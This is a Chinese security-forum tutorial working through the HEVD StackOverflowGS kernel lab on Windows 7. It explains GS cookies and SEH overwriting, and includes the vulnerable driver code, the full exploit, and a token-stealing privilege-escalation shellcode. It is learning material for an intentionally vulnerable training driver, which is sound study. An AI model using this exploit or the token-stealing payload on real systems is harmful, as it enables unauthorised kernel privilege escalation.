> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-270046.htm)

> [原创] 内核漏洞学习 [2]-HEVD-StackOverflowGS

HEVD-StackOverflowGS
====================

一： 概述
-----

HEVD：漏洞靶场，包含各种 Windows 内核漏洞的驱动程序项目，在 Github 上就可以找到该项目，进行相关的学习

 

[Releases · hacksysteam/HackSysExtremeVulnerableDriver · GitHub](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases)

> Windows 7 X86 sp1 虚拟机
> 
> 使用 VirtualKD 和 windbg 双机调试
> 
> HEVD 3.0+KmdManager+DubugView

[](#二：前置知识：)二：前置知识：
-------------------

### [](#（1）栈中的守护天使：gs)（1）栈中的守护天使：GS

安全编译选项 - GS

 

![](https://img-blog.csdnimg.cn/img_convert/c56a301fbdb6cba364c5d57369bd6c9b.png)

 

GS 编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。  
在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，随机数标注为 “SecurityCookie”。  
Security Cookie 位于 EBP 之前, 系统还将在. data 的内存区域中存放一个 Security Cookie 的副本，如图

 

![](https://img-blog.csdnimg.cn/img_convert/3ebc28a4592874dd61a186e70b3ec268.png)

 

当栈中发生溢出时，Security Cookie 将被首先淹没，之后才是 EBP 和返回地址。在函数返回之前，系统将执行一个额外的安全验证操作，被称做 Security check。  
在 Security Check 的过程中，系统将比较栈帧中原先存放的 Security Co okie 和. data 中副本的值，如果两者不吻合，说明栈帧中的 Security Cookie 已被破坏，即栈中发生了溢出。

 

当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行，如图

 

![](https://img-blog.csdnimg.cn/img_convert/149b162bc7b67310b8e6c45592744602.png)

> 但是额外的数据和操作带来的直接后果就是系统性能的下降，为了将对性能的影响降到最小，编译器在编译程序的时候并不是对所有的函数都应用 GS，以下情况不会应用 GS。  
> (1）函数不包含缓冲区。  
> (2）函数被定义为具有变量参数列表。
> 
> (3）函数使用无保护的关键字标记。
> 
> (4）函数在第一个语句中包含内嵌汇编代码。  
> (5）缓冲区不是 8 字节类型且大小不大于 4 个字节。

 

除了在返回地址前添加 Security Cookie 外，在 Visual Studio 2005 及后续版本还使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏。如图

 

![](https://img-blog.csdnimg.cn/img_convert/609ef27b104357ee0a86275342f9f776.png)

> 通过 GS 安全编译选项，操作系统能够在运行中有效地检测并阻止绝大多数基于栈溢出的攻击。要想硬对硬地冲击 GS 机制，是很难成功的。让我们再来看看 Security C ookie 产生的细节。  
> 1. 系统以. data 节的第一个双字作为 Cookie 的种子, 或称原始 Cookie(所有函数的 Cookie 都用这个 DWORD 生成)。  
> 2. 在程序每次运行时 Cookie 的种子都不同，因此种子有很强的随机性  
> 3. 在栈桢初始化以后系统用 ESP 异或种子，作为当前函数的 Cookie，以此作为不同函数之间的区别，并增加 Cookie 的随机性  
> 4. 在函数返回前，用 ESP 还原出（异或）Cookie 的种子

 

在微软出版的 Writing Secure Code 一书中谈到 GS 选项时, 作者还给出了微软内部对 GS 为产品所提供的安全保护的看法:  
修改栈帧中函数返回地址的经典攻击将被 GS 机制有效遏制;  
基于改写函数指针的攻击，GS 很难防御;  
针对异常处理机制的攻击，GS 很难防御;  
GS 是对栈帧的保护机制，因此很难防御堆溢出的攻击。

 

所以绕过 GS 保护有几种方法

> 利用未被保护的内存突破 GS
> 
> 覆盖虚函数突破 GS
> 
> 攻击异常处理突破 GS
> 
> 同时替换栈中和. data 中的 Cookie 突破 GS

### [](#（2）攻击seh绕过gs保护)（2）攻击 SEH 绕过 GS 保护

GS 机制并没有对 S.E.H 提供保护，换句话说我们可以通过攻击程序的异常处理达到绕过 GS 的目的。我们首先通过超长字符串覆盖掉异常处理函数指针，然后想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被我们覆盖，那么我们就可以通过劫持 S.E.H 来控制程序的后续流程。

 

每个 SEH 结构体包含两个 DWORD 指针：SEH 链表指针 next seh 和异常处理函数句柄 Exception handler，共八个字节，存放于栈中。如下图所示，其中 SEH 链表指针 next seh 用于指向下一个 SEH 结构体，异常处理函数句柄 Exception handler 为一个异常处理函数。

```
EXCEPTION_DISPOSITION
__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,
                        void * EstablisherFrame,
                        struct _CONTEXT *ContextRecord,
                        void * DispatcherContext);

```

![](https://img-blog.csdnimg.cn/img_convert/9ccb63f9a1f496e3331f70d50bac6f44.png)

 

Visual C++ 为使用结构化异常处理的函数生成的标准异常堆栈帧，它看起来像下面这个样子：

```
EBP-00 _ebp
EBP-04 trylevel
EBP-08 scopetable数组指针
EBP-0C handler函数地址
EBP-10指向前一个EXCEPTION_REGISTRATION结构
EBP-14 GetExceptionInformation
EBP-18 栈帧中的标准ESP

```

（0day 第十章有详细介绍）

 

关于异常更详细的知识：

 

[[原创] 内核学习 - 异常处理 - 软件逆向 - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com](https://bbs.pediy.com/thread-270045.htm)

[](#三：漏洞点分析)三：漏洞点分析
-------------------

漏洞原理：栈溢出漏洞，使用过程中使用危险的函数，没有对参数进行限制  
BufferOverflowStackGS 开启 GS 保护

 

（1）加载驱动

 

（这部分内容直接使用上一篇分析的 HEVD_BufferOverflowStack 的图片了）

 

安装驱动程序，使用 kmdManager 加载驱动程序，DebugView 检测内核，可以看到加载驱动程序成功。

 

![](https://img-blog.csdnimg.cn/img_convert/5edf823fbae67c4d8ca0d4f6c2a20c11.png)

 

windbg:

 

![](https://img-blog.csdnimg.cn/img_convert/c03497a167be87f6fa54e6665fba402c.png)

```
lm  查看所有已加载模块
lm m H* 设置过滤，查找HEVD模块
lm m HEVD

```

![](https://img-blog.csdnimg.cn/img_convert/6eb6f30640039766a5613027c908b92c.png)

 

（2）分析漏洞点

 

对 BufferOverflowStackGS.c 源码进行分析，漏洞函数 TriggerBufferOverflowStackGS，存在明显的栈溢出漏洞，RtlCopyMemory 函数没有对 KernelBuffer 大小进行验证，直接将 size 大小的 userbuffer 传入缓冲区，没有进行大小的限制，(例如安全版本的 sizeof(KernelBuffer)), 因此造成栈溢出，因为开启了 GS 保护，所以对于 BufferOverflowStackGS，不使用攻击返回地址，而攻击 SEH，覆盖 SEH handle ，人为构造异常，触发异常，执行异常处理函数，（此时异常处理函数是我们的 payload），这个步骤发生在再返回地址，检查 cookie 之前。

```
#define BUFFER_SIZE 512  
 
 
NTSTATUS
TriggerBufferOverflowStackGS(
    _In_ PVOID UserBuffer,
    _In_ SIZE_T Size
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    UCHAR KernelBuffer[BUFFER_SIZE] = { 0 };
 
    PAGED_CODE();
 
    __try
    {
 
 
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
 
#ifdef SECURE
 
 
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));//安全版本
#else
        DbgPrint("[+] Triggering Buffer Overflow in Stack (GS)\n");
 
 
 
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);//不安全版本，未对size做限制
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

```

[](#四：漏洞利用)四：漏洞利用
-----------------

因为 GS 保护，在栈中有 cookie，所以无法溢出到返回地址，那就溢出到 SEH handle，

 

windbg 调试：

 

1. 在 TriggerBufferOverflowStackGS 函数处下断点

```
kd>bp HEVD!TriggerBufferOverflowStackGS

```

2.

```
kd>g  //运行
kd>r  //查看寄存器

```

![](https://img-blog.csdnimg.cn/img_convert/1094923ac8b2c0c8fde4db5bfcc35e92.png)

 

ebp:971c1ae0

 

3. 运行 exp，找到 seh handle 距离 kernelbuffer 的偏移，（后面再说 exp 的原理）。

 

![](https://img-blog.csdnimg.cn/img_convert/c69fb184eb024ea5fd145a72d2390109.png)

 

kernelbuffer:971c18b4

 

4.

> Visual C++ 为使用结构化异常处理的函数生成的标准异常堆栈帧，它看起来像下面这个样子：
> 
> ```
> EBP-00 _ebp
> EBP-04 trylevel
> EBP-08 scopetable数组指针
> EBP-0C handler函数地址
> EBP-10指向前一个EXCEPTION_REGISTRATION结构
> EBP-14 GetExceptionInformation
> EBP-18 栈帧中的标准ESP
> 
> ```

 

EBP-0C handler 函数地址 = 971c1ae0-0c=971c1ad4

 

971c1ad4-kernelbuffer:971c18b4=220, 所以 想要覆盖到 handler 函数地址 需要大小 0x224，偏移确定了，分析下 exp 原理。

 

5.

 

构造 exp（官方 exp）

 

具体原理看注释：

```
DWORD WINAPI StackOverflowGSThread(LPVOID Parameter) {
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    SIZE_T PageSize = 0x1000;
    HANDLE Sharedmemory = NULL;
    PVOID MemoryAddress = NULL;
    PVOID SuitableMemoryForBuffer = NULL;
    LPCSTR FileName = (LPCSTR)DEVICE_NAME;
    LPVOID SharedMappedMemoryAddress = NULL;
    SIZE_T SeHandlerOverwriteOffset = 0x214;
    PVOID EopPayload = &TokenStealingPayladGSWin7;
    LPCTSTR SharedMemoryName = (LPCSTR)SHARED_MEMORY_NAME;
 
    __try {
        // 获得设备句柄
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", FileName);
 
        hFile = GetDeviceHandle(FileName);
 
        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }
 
        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");
 
        DEBUG_INFO("\t\t[+] Creating Shared Memory\n");
 
        // Create the shared memory
        //CreateFileMapping  用于创建一个文件映射内核对象
        Sharedmemory = CreateFileMapping(INVALID_HANDLE_VALUE,
                                         NULL,
                                         PAGE_EXECUTE_READWRITE,
                                         0,
                                         PageSize,
                                         SharedMemoryName);
 
        if (!Sharedmemory) {
            DEBUG_ERROR("\t\t\t[-] Failed To Create Shared Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Shared Memory Handle: 0x%p\n", Sharedmemory);
        }
 
        DEBUG_INFO("\t\t[+] Mapping Shared Memory To Current Process Space\n");
 
        // Map the shared memory in the process space of this process
        //MapViewOfFile 将一个文件映射对象映射到当前应用程序的地址空间
        SharedMappedMemoryAddress = MapViewOfFile(Sharedmemory,
                                                  FILE_MAP_ALL_ACCESS,
                                                  0,
                                                  0,
                                                  PageSize);
 
        if (!SharedMappedMemoryAddress) {
            DEBUG_ERROR("\t\t\t[-] Failed To Map Shared Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Mapped Shared Memory: 0x%p\n", SharedMappedMemoryAddress);
        }
 
        SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset));//SeHandlerOverwriteOffset 0x224大小，距离se handle的偏移
 
        DEBUG_INFO("\t\t[+] Suitable Memory For Buffer: 0x%p\n", SuitableMemoryForBuffer);
 
        DEBUG_INFO("\t\t[+] Preparing Buffer Memory Layout\n");
 
        RtlFillMemory(SharedMappedMemoryAddress, PageSize, 0x41);//'A'填充
 
        MemoryAddress = (PVOID)((ULONG)SuitableMemoryForBuffer + 0x204);
        *(PULONG)MemoryAddress = 0x42424242;           
 
        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] XOR'ed GS Cookie Address: 0x%p\n", MemoryAddress);
 
        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = 0x43434343;          
 
        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = 0x44444444;           
 
        DEBUG_INFO("\t\t\t[+] Next SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] Next SE Handler Address: 0x%p\n", MemoryAddress);
 
        MemoryAddress = (PVOID)((ULONG)MemoryAddress + 0x4);
        *(PULONG)MemoryAddress = (ULONG)EopPayload;     // EopPayload覆盖SE Handler，SuitableMemoryForBuffer+0x220
 
        DEBUG_INFO("\t\t\t[+] SE Handler Value: 0x%p\n", *(PULONG)MemoryAddress);
        DEBUG_INFO("\t\t\t[+] SE Handler Address: 0x%p\n", MemoryAddress);
 
        DEBUG_INFO("\t\t[+] EoP Payload: 0x%p\n", EopPayload);
 
        DEBUG_MESSAGE("\t[+] Triggering Kernel Stack Overflow GS\n");
 
        OutputDebugString("****************Kernel Mode****************\n");
 
        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS,
                        (LPVOID)SuitableMemoryForBuffer,// SuitableMemoryForBuffer = (PVOID)((ULONG)SharedMappedMemoryAddress + (ULONG)(PageSize - SeHandlerOverwriteOffset));//SeHandlerOverwriteOffset 0x224大小，距离se handle的偏移
                        (DWORD)SeHandlerOverwriteOffset + RAISE_EXCEPTION_IN_KERNEL_MODE,//RAISE_EXCEPTION_IN_KERNEL_MODE 0x4,利用这个多出来的0x4大小，使得驱动访问无效内存，触发异常
                        NULL,
                        0,
                        &BytesReturned,
                        NULL);
 
        OutputDebugString("****************Kernel Mode****************\n");
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }
 
    return EXIT_SUCCESS;
}

```

HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS 控制码对应的派遣函数 BufferOverflowStackGSIoctlHandler

```
DriverEntry
{.......
DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;
 ........
}

```

```
IrpDeviceIoCtlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp
)
{
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;
 
    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();
 
    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
 
    if (IrpSp)
    {
        switch (IoControlCode)
        {
       case HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS:
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n");
            Status = BufferOverflowStackGSIoctlHandler(Irp, IrpSp);
            DbgPrint("****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS ******\n");
            break;
 
        }
    }

```

BufferOverflowStackGSIoctlHandler 函数调用 TriggerBufferOverflowStackGS 触发漏洞函数

```
BufferOverflowStackGSIoctlHandler(
    _In_ PIRP Irp,
    _In_ PIO_STACK_LOCATION IrpSp
)
{
    SIZE_T Size = 0;
    PVOID UserBuffer = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
    UNREFERENCED_PARAMETER(Irp);
    PAGED_CODE();
    //首先将指定的Method参数设置为METHOD_NEITHER。DeviceI0Control函数中
 
//往驱动中Input数据：通过I/O堆栈的Parameters.DeviceIoControl.Type3InputBuffer得到DeviceIoControl提供的输入缓冲区地址，Parameters.DeviceIoControl.InputBufferLength得到其长度。
 
    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
 
    if (UserBuffer)
    {
        Status = TriggerBufferOverflowStackGS(UserBuffer, Size);
    }
 
    return Status;
}

```

payload 功能：遍历进程，得到系统进程的 token，把当前进程的 token 替换，达到提权目的。

 

相关内核结构体：

 

在内核模式下，fs:[0] 指向 KPCR 结构体

```
_KPCR
+0x120 PrcbData         : _KPRCB
_KPRCB
+0x004 CurrentThread    : Ptr32 _KTHREAD，_KTHREAD指针，这个指针指向_KTHREAD结构体
_KTHREAD
+0x040 ApcState         : _KAPC_STATE
_KAPC_STATE
+0x010 Process          : Ptr32 _KPROCESS,_KPROCESS指针，这个指针指向EPROCESS结构体
_EPROCESS
   +0x0b4 UniqueProcessId  : Ptr32 Void,当前进程ID，系统进程ID=0x04
   +0x0b8 ActiveProcessLinks : _LIST_ENTRY，双向链表，指向下一个进程的ActiveProcessLinks结构体处，通过这个链表我们可以遍历所有进程，以寻找我们需要的进程
   +0x0f8 Token            : _EX_FAST_REF，描述了该进程的安全上下文，同时包含了进程账户相关的身份以及权限

```

payload：

```
__asm {
       pushad                               ; 保存寄存器
 
 
       xor eax, eax                         ;eax置0
       mov eax, fs:[eax + KTHREAD_OFFSET]   ; 获得当前线程的_KTHREAD结构，KTHREAD_OFFSET=0x124
                                            ; FS:[0x124] 是 _KTHREAD结构
 
       mov eax, [eax + EPROCESS_OFFSET]     ;  找到_EPROCESS结构， nt!_KTHREAD.ApcState.Process，EPROCESS_OFFSET 0x50
 
 
       mov ecx, eax                         ; ecx ，当前进程Eprocess结构体
 
       mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4
 
       SearchSystemPID:
           mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink，FLINK_OFFSET=0xb8
           sub eax, FLINK_OFFSET
           cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId，PID_OFFSET=0xb4
           jne SearchSystemPID              ;遍历链表根据PID判断是否为SYSTEM_PID(0x4)
       //替换token
       mov edx, [eax + TOKEN_OFFSET]        ; 获得系统进程token  。TOKEN_OFFSET=0xf8
       mov [ecx + TOKEN_OFFSET], edx        ; 系统进程token替换当前进程token
 
       ; End of Token Stealing Stub
 
       popad                                ; Restore registers state
 
       ; Kernel Recovery Stub
       xor eax, eax                         ; Set NTSTATUS SUCCEESS
       add esp, 12                          ; Fix the stack
       pop ebp                              ; Restore saved EBP
       ret 8                                ; Return cleanly
   }

```

提权成功：

 

![](https://img-blog.csdnimg.cn/img_convert/9f162071066d0c5108592a9ba053354b.png)

 

在网上看到的一个思路，没有获取 se handle 到 kernelbuffer 的偏移，而是直接将缓冲区数据全部写成 payload 地址，

```
memset(pMapView, 'a', PAGE_SIZE);
 PULONG pOverflowBuffer = (PULONG)((ULONG)pMapView + (PAGE_SIZE - BUFFER_SIZE));// pOverflowBuffer 到被设置为映射内存区的尾部，差BUFFER_SIZE大小
 
 for (ULONG i= 0; i < BUFFER_SIZE; i += 4)
 {
   *(PULONG)((ULONG)pOverflowBuffer + i) = (ULONG)&payload;
 }
 
 ULONG length = 0;
 BOOL ret = DeviceIoControl(hDevice,
     CASE_ID,
     (LPVOID)pOverflowBuffer,
     BUFFER_SIZE + MISS_PAGE_SIZE, 
     //pOverflowBuffer +BUFFER_SIZE + MISS_PAGE_SIZE---》导致驱动访问MISS_PAGE_SIZE大小的无效内存，触发异常
 
     NULL,
     0,
     &length,
     NULL);

```

测试结果，蓝屏了

[](#五：补丁分析)五：补丁分析
-----------------

对 RtlCopyMemory 的参数进行严格的设置，使用 sizeof(kernelbuffer)  
其他：  
刚接触内核漏洞，如果有哪写的不对，希望大佬们指出

[[培训] 优秀毕业生寄语：恭喜 id 咸鱼炒白菜拿到远超 3W 月薪的 offer，《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-16096.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#缓冲区溢出](forum-150-1-156.htm) [#Windows](forum-150-1-160.htm)